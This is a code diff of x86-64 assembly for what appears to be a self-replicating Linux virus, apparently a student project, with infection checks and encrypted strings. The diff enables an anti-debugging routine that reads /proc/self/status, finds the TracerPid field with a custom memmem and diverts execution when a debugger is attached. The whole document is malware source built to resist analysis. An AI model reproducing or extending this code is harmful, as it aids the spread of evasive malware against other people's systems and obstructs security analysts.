@@ -13,13 +13,13 @@ _start:
     mov rbp, rsp
 	PUSHA
 	call _map_int_table
-	; call _check_debug
+	call _check_debug
 
-	lea rdi, [rel procPath]
-	mov rsi, procPathLen
-	call _decrypt_str
-	mov rdi, rax
-	call _initDir
+	; lea rdi, [rel procPath]
+	; mov rsi, procPathLen
+	; call _decrypt_str
+	; mov rdi, rax
+	; call _initDir
 
     call _isInfectionAllow
     test rax, rax
@@ -59,26 +59,137 @@ _start:
     jmp _exit
 
 _check_debug:
-	mov rax, 0x6e ; sys_getppid
-	syscall
+	; === open("/proc/self/status", O_RDONLY) ===
+    lea rdi, [rel selfStatus]
+	mov rsi, selfLen
+	call _decrypt_str
+	mov rdi, rax
+    mov rax, 0x2              ; syscall: open
+	mov rsi, selfLen
+    xor rsi, rsi            ; O_RDONLY = 0
+    syscall
+    cmp rax, 0x0
+    jl _final_jmp                ; if open failed, skip
+    mov r12, rax            ; save fd
+
+	sub rsp, 0x200
+
+	; === read(fd, buffer, 512) ===
+	_read:
+    mov rdi, r12            ; fd
+    mov rsi, rsp      ; buffer
+    mov rdx, 0x200            ; count
+    mov rax, 0              ; syscall: read
+    syscall
+
 	push rax
-	mov rsi, rax
-	mov rax, SYS_PTRACE
-	mov rdi, PTRACE_TRACEME
-	mov rdx, 0x1
-	mov r10, 0x0
+
+	mov rax, SYS_CLOSE
+	mov rdi, r12
 	syscall
-	cmp rax, 0
-	; jl _exit
-	jl _final_jmp
-	pop rax
+
+	lea rdi, [rel tracer_str]
+	mov rsi, tracer_len
+	call _decrypt_str
+	mov rdi, rax
+
+	mov rsi, tracer_len
+	pop r10
+	mov rdx, rsp
+	_bmem:
+	call memmem
+	
+	test rax, rax
+	jz _final_jmp
+
 	mov rsi, rax
-	mov rax, SYS_PTRACE
-	mov rdi, PTRACE_DETACH
-	mov rdx, 0x1
-	mov r10, 0x0
-	syscall
+	add rsi, tracer_len + 1
+	xor rax, rax
+	xor rcx, rcx
+
+_parse_digit:
+    mov bl, byte [rsi + rcx]
+    cmp bl, '0'
+    jl _done_parse
+    cmp bl, '9'
+    jg _done_parse
+    imul eax, eax, 10
+    sub bl, '0'
+    add eax, ebx
+    inc rcx
+    jmp _parse_digit
+
+_done_parse:
+	mov r10, rax
+	mov     rdi, rsp        ; rbx contient l’adresse à nettoyer
+    mov     rcx, 0x200         ; 64 octets à zéro
+    xor     rax, rax
+    cld
+    rep stosb
+	add rsp, 0x200
+	cp:
+	cmp r10, 0
+	jne _final_jmp
+
 	ret
+
+; memmem(needle, needle_len, haystack, haystack_len)
+; rdi = needle, rsi = needle_len
+; rdx = haystack, rcx = haystack_len
+; retour: rax = adresse du match ou 0
+
+memmem:
+    push rbx
+    push rdi
+    push rsi
+    push rdx
+    push rcx
+
+    ; Vérifie si needle est plus long que haystack
+    cmp rcx, rsi
+    jb _not_found
+
+    ; Préparation
+    mov r8, rdi        ; r8 = ptr needle
+    mov r9, rsi        ; r9 = len needle
+    mov r10, rdx       ; r10 = ptr haystack
+    mov r11, rcx       ; r11 = len haystack
+
+_next_pos:
+    ; si (haystack_len < needle_len) → pas trouvé
+    cmp r11, r9
+    jb _not_found
+
+    ; comparaison par `repe cmpsb`
+    mov rdi, r10       ; haystack pos
+    mov rsi, r8        ; needle
+    mov rcx, r9        ; taille needle
+    repe cmpsb
+    je _found
+
+    ; pas trouvé ici, avancer dans haystack
+    inc r10
+    dec r11
+    jmp _next_pos
+
+_found:
+    mov rax, r10       ; r10 a été incrémenté → revenir en arrière
+    sub rax, 1         ; car inc avant
+    pop rcx
+    pop rdx
+    pop rsi
+    pop rdi
+    pop rbx
+    ret
+
+_not_found:
+    xor rax, rax
+    pop rcx
+    pop rdx
+    pop rsi
+    pop rdi
+    pop rbx
+    ret
 
 ; take directory to open in rdi-> pwd
 ; rdx == 0 ? rien : recreate a path: rdi/rsi
@@ -201,7 +312,6 @@ _readDir:
 		or qword FAM(pestilence.fd), -1
 		jmp _returnLeave
 
-
 _returnLeave:
     leave
 
@@ -231,15 +341,6 @@ _check_proc:
 	syscall
 	test rax, rax
 	jz _next
-
-	; push rdi
-	; mov rax, SYS_WRITE
-	; mov rdi, 0x1
-	; mov rsi, rsp
-	; mov rdx, 0x4
-	; syscall
-	; pop rdi
-	; _br_write:
 
 	mov rax, SYS_CLOSE
 	syscall 
@@ -986,6 +1087,10 @@ headerGetLen equ $ - headerGet
 procPath db "/proc", 0x0
 procPathLen equ $ - procPath
 comm db "comm", 0x0
+selfStatus db "/proc/self/status" , 0x0
+selfLen equ $ - selfStatus
+tracer_str  db "TracerPid:", 0x9   ; "TracerPid:\t", 0x0
+tracer_len  equ $ - tracer_str
 timespec:
     dq 0          ; Secondes
     dq 10000000     ; 100ms
